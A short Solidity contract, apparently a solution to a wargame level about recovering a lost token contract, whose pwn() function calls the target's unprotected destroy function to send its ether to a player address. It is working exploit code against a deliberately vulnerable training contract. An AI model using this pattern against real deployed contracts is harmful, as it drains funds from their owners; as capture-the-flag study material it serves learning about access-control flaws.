pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address _to) external;
}

contract AttackRecovery {
    address lostContractAddress = YOUR_LOST_CONTRACT_ADDRESS;
    ISimpleToken lostContract = ISimpleToken(lostContractAddress);
    
    function pwn() public {
        lostContract.destroy(YOUR_PLAYER_ADDRESS);
    }
}
